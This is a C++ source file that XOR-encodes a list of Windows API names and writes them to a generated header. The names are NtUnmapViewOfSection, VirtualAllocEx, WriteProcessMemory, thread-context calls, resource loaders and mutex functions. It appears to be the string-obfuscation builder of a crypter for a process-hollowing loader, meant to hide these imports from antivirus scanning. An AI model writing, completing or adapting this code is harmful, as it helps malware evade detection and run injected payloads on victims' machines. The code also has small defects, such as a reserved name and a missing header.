#include <fstream>
#include <iostream>
using namespace std;



void xor(char *str, const char *clave, const int tamStr, const int tamClave)
{
   for(int n=0; n<=tamStr; n++)
      str[n] ^= clave[n%tamClave];
}


void encrypt(char *str, const char *clave, char *type, char *label)
{
fstream buff;
buff.open("strings.h", ios::app);

int tamStr=strlen(str);
int tamClave=strlen(clave);

buff << type << " " << label << "[]" << " = { ";

xor(str, clave, tamStr, tamClave);
for(int n=0; n<=tamStr; n++)
   {
	   buff << "0x" << hex <<(unsigned int) str[n];
	   if(n!=tamStr) buff  <<  ", ";
   }
buff << " };" << endl;
buff.close();
}




int main()
{
   char key[256];
   char strNTdll[]				= "ntdll.dll";
   char strKernel32[]				= "kernel32.dll";
   char strGetModuleHandleA[]			= "GetModuleHandleA";
   char strGetProcAddress[]			= "GetProcAddress";
   char strCreateProcessA[]			= "CreateProcessA";
   char strNtUnmapViewOfSection[]		= "NtUnmapViewOfSection";
   char strVirtualAllocEx[]			= "VirtualAllocEx";
   char strWriteProcessMemory[]			= "WriteProcessMemory";
   char strGetThreadContext[]			= "GetThreadContext";
   char strSetThreadContext[]			= "SetThreadContext";
   char strResumeThread[]			= "ResumeThread";
   char strCreateMutexA[]			= "CreateMutexA";
   char strOpenMutexA[]				= "OpenMutexA";
   char strGetModuleFileNameA[]			= "GetModuleFileNameA";
   char strSizeofResource[]			= "SizeofResource";
   char strLoadResource[]			= "LoadResource";
   char strFindResourceA[]			= "FindResourceA";
   char strLockResource[]			= "LockResource";

//-----------------------------------------------------------------------
   
   cout << "Please enter a strong Encryption Key: ";
   cin.getline(key, 256);

   fstream bufz;
   bufz.open("strings.h", ios::trunc|ios::out);
   bufz << "const char clave[256] = \"" << key << "\";" << endl;
   bufz << "const int tamClave = strlen(clave);" << endl;
   bufz << "\n" << endl;
   bufz.close();

//-----------------------------------------------------------------------

   encrypt(strNTdll, key, "char", "strNTdll");
   encrypt(strKernel32, key, "char", "strKernel32");
   encrypt(strGetModuleHandleA, key, "char", "strGetModuleHandleA");
   encrypt(strGetProcAddress, key, "char", "strGetProcAddress");
   encrypt(strCreateProcessA, key, "char", "strCreateProcessA");
   encrypt(strNtUnmapViewOfSection, key, "char", "strNtUnmapViewOfSection");
   encrypt(strVirtualAllocEx, key, "char", "strVirtualAllocEx");
   encrypt(strWriteProcessMemory, key, "char", "strWriteProcessMemory");
   encrypt(strGetThreadContext, key, "char", "strGetThreadContext");
   encrypt(strSetThreadContext, key, "char", "strSetThreadContext");
   encrypt(strResumeThread, key, "char", "strResumeThread");
   encrypt(strCreateMutexA, key, "char", "strCreateMutexA");
   encrypt(strOpenMutexA, key, "char", "strOpenMutexA");
   encrypt(strGetModuleFileNameA, key, "char", "strGetModuleFileNameA");
   encrypt(strSizeofResource, key, "char", "strSizeofResource");
   encrypt(strLoadResource, key, "char", "strLoadResource");
   encrypt(strFindResourceA, key, "char", "strFindResourceA");
   encrypt(strLockResource, key, "char", "strLockResource");

//-----------------------------------------------------------------------
   return 0;
}